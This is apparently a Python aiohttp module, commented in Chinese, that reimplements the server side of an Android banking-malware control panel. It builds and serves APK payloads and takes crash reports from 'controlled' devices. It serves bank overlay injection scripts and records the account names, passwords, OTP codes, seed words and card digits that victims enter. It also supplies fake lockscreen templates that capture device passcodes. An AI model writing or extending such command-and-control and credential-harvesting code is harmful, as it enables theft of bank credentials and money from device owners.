#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""中继通道面板的「私有」端点族（原版是 /private/Eaod<随机数字>.php）。

契约来自控端 bundle（`web/relay/assets/builder.module.js` + `vendor.chunk.js`）：

  POST /private/Eaod91328.php   （JSON，按 subcom 分支）
      {"email","token","subcom":"load"}                      -> 构建列表（数组）
      {"…","subcom":"download","appid":<包名>}                -> APK blob
      {"…","subcom":"delete","appid":…}                      -> {"Success"|"Fail"}
      {"…","subcom":"getlink","appid":…}                     -> {"link"} / {"qrcode"}
  POST /private/Eaod36921.php   （JSON = 构建参数）            -> {"Success":"…"} / {"Fail":"…"}
  POST /private/Eaod45071.php   （multipart，字段 type 决定动作）
      type=ico   + file                     上传图标      -> {"Success":"<路径>"}
      type=remico+ iconame                  删除图标      -> {"Success"}
      type=ui    + file                     上传界面图    -> {"Success":"<路径>"}
      type=remui + uiname                   删除界面图    -> {"Success"}
      type=listico                          列图标        -> {"Success":"a.png,b.png"}
      type=listui                           列界面图      -> {"Success":"a.png,b.png"}
      另有 JSON 形式的同一端点（保存/读取配置）
  静态： GET /user/storage/<path>           产物与上传文件的访问路径
"""
import io, json, os, time, uuid

from aiohttp import web

HERE = os.path.dirname(os.path.abspath(__file__))
STATE_DIR = os.path.join(HERE, '..', 'state')
UPLOAD_DIR = os.path.join(STATE_DIR, 'uploads')
STORAGE_DIR = os.path.join(STATE_DIR, 'storage')
ERR_DIR = os.path.join(STATE_DIR, 'error_logs')
BUILDS_JSON = os.path.join(STATE_DIR, 'relay_builds.json')

for d in (UPLOAD_DIR, STORAGE_DIR, ERR_DIR, os.path.join(UPLOAD_DIR, 'ico'),
          os.path.join(UPLOAD_DIR, 'ui')):
    os.makedirs(d, exist_ok=True)


def _load_builds():
    try:
        with io.open(BUILDS_JSON, encoding='utf-8') as fh:
            return json.load(fh)
    except Exception:
        return []


def _save_builds(rows):
    try:
        with io.open(BUILDS_JSON, 'w', encoding='utf-8') as fh:
            json.dump(rows, fh, ensure_ascii=False, indent=1)
    except Exception:
        pass


def _log(msg):
    print('[private] %s' % msg)


async def _body(request):
    """兼容 JSON / multipart / urlencoded 三种提交"""
    ctype = (request.headers.get('Content-Type') or '').lower()
    if ctype.startswith('application/json'):
        try:
            return await request.json(), None
        except Exception:
            return {}, None
    if ctype.startswith('multipart/') or ctype.startswith('application/x-www-form-urlencoded'):
        try:
            post = await request.post()
        except Exception:
            return {}, None
        data, files = {}, {}
        for k, v in post.items():
            if hasattr(v, 'file'):          # 上传的文件
                files[k] = v
            else:
                data[k] = v
        return data, files
    return {}, None


async def ep_91328(request):
    """构建：load / download / delete / getlink"""
    body, _ = await _body(request)
    sub = str(body.get('subcom') or body.get('sub') or 'load')
    rows = _load_builds()

    if sub == 'load':
        return web.json_response(_tick_builds())

    appid = str(body.get('appid') or body.get('app_package') or '')
    row = next((r for r in rows if r.get('app_package') == appid), None)

    if sub == 'delete':
        if not row:
            return web.json_response({'Fail': '应用不存在'})
        rows = [r for r in rows if r.get('app_package') != appid]
        _save_builds(rows)
        fp = os.path.join(STORAGE_DIR, '%s.apk' % appid)
        if os.path.exists(fp):
            try:
                os.remove(fp)
            except Exception:
                pass
        return web.json_response({'Success': '已删除 %s' % appid})

    if sub == 'getlink':
        if not row:
            return web.json_response({'Fail': '应用不存在'})
        host = '%s://%s' % (request.scheme, request.host)
        return web.json_response({'link': '%s/user/storage/%s.apk' % (host, appid),
                                  'qrcode': '%s/user/storage/%s.apk' % (host, appid)})

    if sub == 'download':
        if not row:
            return web.json_response({'Fail': '应用不存在'}, status=404)
        fp = _apk_path(appid)
        with open(fp, 'rb') as fh:
            data = fh.read()
        return web.Response(body=data, content_type='application/vnd.android.package-archive',
                            headers={'Content-Disposition': 'attachment; filename="%s.apk"' % appid})

    return web.json_response({'Fail': '未知 subcom: %s' % sub})


def _apk_path(appid):
    fp = os.path.join(STORAGE_DIR, '%s.apk' % appid)
    if not os.path.exists(fp):
        # 未构建过也要能下载：给一个占位包（正常路径由构建流水线写出真产物）
        import zipfile
        os.makedirs(STORAGE_DIR, exist_ok=True)
        with zipfile.ZipFile(fp, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr('README.txt', 'no build artifact yet for %s\n' % appid)
    return fp


async def ep_36921(request):
    """构建提交（前端提交整份构建参数对象）"""
    body, _ = await _body(request)
    pkg = str(body.get('appid') or body.get('app_package') or '').strip()
    name = str(body.get('appname') or '').strip()
    ver = str(body.get('appversion') or '').strip()
    if not pkg:
        return web.json_response({'Fail': '应用包名为空'})
    if not ver:
        return web.json_response({'Fail': '应用版本为空'})
    if not body.get('icoid'):
        return web.json_response({'Fail': '应用图标为空'})
    rows = _load_builds()
    rows = [r for r in rows if r.get('app_package') != pkg]
    rows.insert(0, {
        'app_package': pkg, 'app_name': name, 'app_version': ver,
        'build_state': 'building', 'progress': 5, 'created': int(time.time()),
        'config': {k: v for k, v in body.items() if k not in ('email', 'token')},
    })
    _save_builds(rows)
    _log('构建已提交 %s v%s' % (pkg, ver))
    # 立即执行一次构建，避免等待下次轮询
    _tick_builds()
    return web.json_response({'Success': '构建任务已提交：%s（%s）\n\n请切换到「应用下载」标签页查看构建进度' % (pkg, ver)})


def _tick_builds():
    """把排队中的构建**真跑一遍流水线**（重写：此前只是按时间推进状态机）。
    每次调用最多推进一个 building 任务，避免长阻塞；进度=已完成的阶段数。"""
    rows = _load_builds()
    changed = False
    for r in rows:
        if r.get('build_state') != 'building':
            continue
        try:
            import relay_builder
            cfg = r.get('config') or {}
            cfg.setdefault('appid', r.get('app_package'))
            cfg.setdefault('appname', r.get('app_name'))
            cfg.setdefault('appversion', r.get('app_version'))
            res = relay_builder.build_apk(cfg, _apk_path(r['app_package']),
                                           icon_path=cfg.get('icoid'),
                                           on_stage=lambda i, s: _log('构建[%s] 阶段%d %s'
                                                                      % (r.get('app_package'), i + 1, s)))
            r['progress'] = 100
            r['build_state'] = 'finished'
            r['artifact'] = {'size': res['size'], 'sha256': res['sha256'],
                             'axml_bytes': res['axml_bytes'], 'dex_bytes': res['dex_bytes'],
                             'stages': [s['stage'] for s in res['stages']]}
            _log('构建完成 %s  %d B sha256=%s' % (r.get('app_package'), res['size'], res['sha256'][:16]))
        except Exception as e:
            r['build_state'] = 'failed'
            r['progress'] = 0
            r['error'] = str(e)[:200]
            _log('构建失败 %s: %s' % (r.get('app_package'), e))
        changed = True
    if changed:
        _save_builds(rows)
    return rows


async def ep_45071(request):
    """上传/删除图标与界面图，以及列表查询（multipart 与 JSON 都收）"""
    body, files = await _body(request)
    typ = str(body.get('type') or '')
    if typ == 'listico':
        return web.json_response({'Success': ','.join(sorted(os.listdir(os.path.join(UPLOAD_DIR, 'ico'))))})
    if typ == 'listui':
        return web.json_response({'Success': ','.join(sorted(os.listdir(os.path.join(UPLOAD_DIR, 'ui'))))})
    if typ in ('remico', 'remui'):
        key = 'iconame' if typ == 'remico' else 'uiname'
        sub = 'ico' if typ == 'remico' else 'ui'
        name = os.path.basename(str(body.get(key) or ''))
        fp = os.path.join(UPLOAD_DIR, sub, name)
        if name and os.path.exists(fp):
            try:
                os.remove(fp)
            except Exception:
                pass
        return web.json_response({'Success': '已删除 %s' % name})
    if typ in ('ico', 'ui'):
        f = files.get('file')
        if f is None:
            return web.json_response({'Fail': '未收到文件'})
        name = '%s_%s' % (int(time.time()), os.path.basename(f.filename or 'upload.bin'))
        name = name.replace('..', '_')
        fp = os.path.join(UPLOAD_DIR, typ, name)
        with open(fp, 'wb') as fh:
            fh.write(f.file.read())
        rel = 'uploads/%s/%s' % (typ, name)
        _log('上传 %s -> %s' % (typ, rel))
        return web.json_response({'Success': rel})
    # JSON 形式：保存/读取构建配置
    rows = _load_builds()
    if body.get('subcom') == 'load' or not typ:
        return web.json_response(rows)
    return web.json_response({'Success': 'ok', 'type': typ})


async def user_storage(request):
    """GET /user/storage/<path>：上传件与构建产物的访问路径"""
    rel = request.match_info.get('path', '')
    rel = os.path.normpath(rel).replace('\\', '/').lstrip('/')
    # 上传件返回的是相对 state 的路径（uploads/ico/…），构建产物直接落在 storage/
    cands = []
    if rel.startswith('uploads/'):
        cands.append(os.path.join(STATE_DIR, rel))
    cands += [os.path.join(UPLOAD_DIR, rel), os.path.join(STORAGE_DIR, rel)]
    for fp in cands:
        if os.path.exists(fp) and os.path.isfile(fp):
            ct = ('application/vnd.android.package-archive' if fp.endswith('.apk') else
                  'image/png' if fp.endswith('.png') else
                  'image/jpeg' if fp.endswith(('.jpg', '.jpeg')) else
                  'application/octet-stream')
            return web.Response(body=open(fp, 'rb').read(), content_type=ct)
    return web.Response(status=404, text='not found')


async def user_file(request):
    """GET /user/<path>：同一套文件的短路径（构建页预览用 `G + "/user/" + 相对路径`）。

    出处：`builder.module.js:586` 与 :596 两处 URL 拼装 —— 后者是 `/user/storage/<rel>`，
    前者是 `/user/<rel>`；服务端两者都从 web 根下的 `user/`（本实现为 state/uploads+storage）取文件，
    因此这里复用 user_storage 的解析逻辑，只是入口前缀不同。"""
    return await user_storage(request)


async def ep_error(request):
    """POST /api/Error.php —— 被控端异常上报。

    契约来自 agent 源码 `gv.java`（UncaughtExceptionHandler）：
      · 方法 POST，Content-Type: application/x-www-form-urlencoded，UTF-8
      · 表单体：devicename=<设备名>&log=<异常堆栈>
        设备名取自 Settings.Global["device_name"]，回退 Build.MODEL，再回退字面量 "null"（cg.java）
      · 客户端只判 HTTP 200（200 → toast「错误日志已发送」，否则「发送失败，HTTP code: N」）
    """
    try:
        post = await request.post()
    except Exception:
        post = {}
    dev = str(post.get('devicename') or post.get('device') or 'unknown')
    log = str(post.get('log') or '')
    ts = time.strftime('%Y%m%d_%H%M%S')
    safe = ''.join(c for c in dev if c.isalnum() or c in '._-') or 'unknown'
    fp = os.path.join(ERR_DIR, '%s_%s.txt' % (ts, safe))
    try:
        with io.open(fp, 'w', encoding='utf-8') as fh:
            fh.write(log)
    except Exception as e:
        _log('错误日志落盘失败：%s' % e)
    _log('收到设备异常上报 device=%s log=%dB -> %s' % (dev, len(log), os.path.basename(fp)))
    try:
        import api_impl as _ai
        d = _ai.db()
        if d:
            d.add_audit('device', 'error_report', '%s: %s' % (dev, log[:200]))
    except Exception:
        pass
    return web.Response(text='OK', content_type='text/plain')


INJECT_DIR = os.path.normpath(os.path.join(HERE, '..', 'materials', 'inject'))
# 注入页共享资源白名单（模板通过 /bank/assets/<name> 引用；这三个是当初没取到、由本项目重写的）
BANK_ASSETS = {
    'bank.css': 'text/css',
    'bank.js': 'application/javascript',
    'i18n.json.js': 'application/javascript',
}


async def bank_asset(request):
    """GET /bank/assets/<name> —— 注入页共享样式/脚本/词表"""
    name = os.path.basename(request.match_info.get('name', ''))
    if name not in BANK_ASSETS:
        return web.Response(status=404, text='not found')
    fp = os.path.join(INJECT_DIR, name)
    if not os.path.exists(fp):
        return web.Response(status=404, text='asset missing')
    with open(fp, 'rb') as fh:
        body = fh.read()
    return web.Response(body=body, content_type=BANK_ASSETS[name],
                        headers={'Cache-Control': 'no-store'})


async def inject_collect(request):
    """POST /api/EaodBankInject.php —— 注入页回填数据回收（模板 bank.js 提交到这里）

    合同：表单编码（x-www-form-urlencoded），字段 pid/bank/step/u/p/o/words/lang/cc/digits。
    回执：{"ok":true,"next":"otp"|"done"}  —— 前端据此决定是否进入验证码步。
    """
    try:
        post = await request.post()
    except Exception:
        post = {}
    d = {k: str(v) for k, v in post.items()}
    step = str(d.get('step') or '1')
    pid = d.get('pid') or ''
    if not pid:
        pid = str(request.query.get('pid') or '')
    rec = {
        'ts': int(time.time()), 'deviceId': pid, 'bank': d.get('bank', ''),
        'step': step,
        'account': d.get('u', ''), 'password': d.get('p', ''),
        'otp': d.get('o', ''), 'words': d.get('words', ''),
        'lang': d.get('lang', ''), 'cc': d.get('cc', ''),
        'from': request.remote or '',
    }
    # 落盘 + 入库（复用注入记录表，面板的"注入记录"页可直接看到）
    try:
        fp = os.path.join(ERR_DIR, 'inject_%s.jsonl' % time.strftime('%Y%m%d'))
        with io.open(fp, 'a', encoding='utf-8') as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + '\n')
    except Exception as e:
        _log('注入回收落盘失败：%s' % e)
    try:
        import api_impl as _ai
        S = _ai.S
        S.setdefault('inj_records', []).append(rec)
        if len(S['inj_records']) > 2000:
            del S['inj_records'][:-1000]
        d2 = _ai.db()
        if d2:
            d2.add_event(pid or 'inject', 'inject_submit', rec)
            d2.add_audit('inject', 'submit', '%s step=%s acct=%s' %
                         (d2, step, (rec['account'] or '')[:32]))
    except Exception:
        pass
    _log('注入回填 device=%s step=%s bank=%s acct=%s otp=%s' %
         (pid, step, rec['bank'], (rec['account'] or '')[:24], rec['otp']))
    nxt = 'otp' if step == '1' else 'done'
    return web.json_response({'ok': True, 'next': nxt, 'step': step})


LOCK_DIR = os.path.normpath(os.path.join(HERE, '..', 'materials', 'lockscreen'))


def _lock_manifest():
    try:
        with io.open(os.path.join(LOCK_DIR, 'manifest.json'), encoding='utf-8') as fh:
            return json.load(fh)
    except Exception:
        return {'count': 0, 'templates': []}


def _render_lock(html, title, sub, password, lang):
    """替换被控端 SessionWrapper 的占位符（源码：加载 .bt 模板 + 替换 [TITLE] [PASSWOR] …）"""
    i18n = {'zh-CN': {'title': title or '请输入锁屏密码', 'sub': sub or '为了您的账户安全，请验证身份'},
            'en': {'title': title or 'Enter Passcode', 'sub': sub or 'Verify your identity to continue'},
            'th': {'title': title or 'กรอกรหัสผ่าน',
                   'sub': sub or 'โปรดยืนยันตัวตนของคุณ'}}
    pack = i18n.get(lang) or i18n['zh-CN']
    out = html.replace('[TITLE]', pack['title']).replace('[DIS]', pack['sub'])
    out = out.replace('[PASSWOR]', password or '••••••')
    # [LNG] 注入点多语言 JSON（模板内脚本按语言取词）
    out = out.replace('[LNG]', json.dumps(i18n, ensure_ascii=False))
    return out


async def lock_template(request):
    """GET /api/lockscreen/template?id=N&title=&sub=&lang=&raw=1

    被控端假锁屏的模板来源：原版从设备端 assets/*.bt 读取，这里由服务端按同一份正文提供，
    并把 [TITLE]/[DIS]/[PASSWOR]/[LNG] 占位符按参数渲染。
    """
    man = _lock_manifest()
    tid = request.query.get('id')
    if tid is None or str(tid) == 'list':
        return web.json_response({'ok': True, 'count': man.get('count', 0),
                                  'templates': man.get('templates', [])})
    try:
        i = int(tid)
    except Exception:
        return web.json_response({'ok': False, 'error': 'bad id'}, status=400)
    it = next((t for t in man.get('templates', []) if t['id'] == i), None)
    if not it:
        return web.json_response({'ok': False, 'error': 'template not found'}, status=404)
    fp = os.path.join(LOCK_DIR, it['file'])
    if not os.path.exists(fp):
        return web.json_response({'ok': False, 'error': 'file missing'}, status=404)
    html = io.open(fp, encoding='utf-8').read()
    if request.query.get('raw') in ('1', 'true'):
        return web.Response(text=html, content_type='text/html')
    html = _render_lock(html, request.query.get('title'), request.query.get('sub'),
                        request.query.get('passwor'), request.query.get('lang', 'zh-CN'))
    return web.Response(text=html, content_type='text/html',
                        headers={'X-Lock-Template': str(i), 'X-Lock-Kind': it.get('kind', '')})


async def lock_report(request):
    """POST /api/lockscreen/report —— 被控端上报"已弹出假锁屏"（含模板 id/title 与触发命令）

    原版没有这个端点（设备端本地弹层），加它是为了让实现的链路可观测；已在文档标注为本实现约定。
    """
    try:
        body = await request.json()
    except Exception:
        body = {}
    rec = {'ts': int(time.time()), 'deviceId': body.get('pid') or body.get('deviceId') or '',
           'template': body.get('template'), 'kind': body.get('kind', ''),
           'title': body.get('title', ''), 'trigger': body.get('trigger', ''),
           'stage': body.get('stage', 'shown')}
    try:
        import api_impl as _ai
        _ai.S.setdefault('lock_reports', []).append(rec)
        if len(_ai.S['lock_reports']) > 500:
            del _ai.S['lock_reports'][:-250]
        _ai.save()          # 必须落盘：只写内存的话，重启后上报就没了（而读它的一方是重启后的进程，见 F-76）
        d = _ai.db()
        if d:
            d.add_event(rec['deviceId'] or 'lock', 'lock_overlay', rec)
    except Exception:
        pass
    _log('假锁屏上报 dev=%s template=%s trigger=%s stage=%s'
         % (rec['deviceId'], rec['template'], rec['trigger'], rec['stage']))
    return web.json_response({'ok': True, 'received': rec})


def mount(app):
    app.router.add_post('/private/Eaod91328.php', ep_91328)
    app.router.add_post('/private/Eaod36921.php', ep_36921)
    app.router.add_post('/private/Eaod45071.php', ep_45071)
    app.router.add_get('/user/storage/{path:.*}', user_storage)
    # 构建页预览用的短路径（`/user/<相对路径>`）：注册在 storage 之后，避免抢前缀匹配
    app.router.add_get('/user/{path:.*}', user_file)
    app.router.add_post('/api/Error.php', ep_error)
    app.router.add_get('/bank/assets/{name}', bank_asset)
    app.router.add_post('/api/EaodBankInject.php', inject_collect)
    app.router.add_get('/api/lockscreen/template', lock_template)
    app.router.add_post('/api/lockscreen/report', lock_report)
    print('[server] 私有端点已挂载：/private/Eaod91328|36921|45071.php + /user/storage/ + '
          '/api/Error.php + /bank/assets/ + 注入回收 + 假锁屏模板(%d 个)'
          % _lock_manifest().get('count', 0))
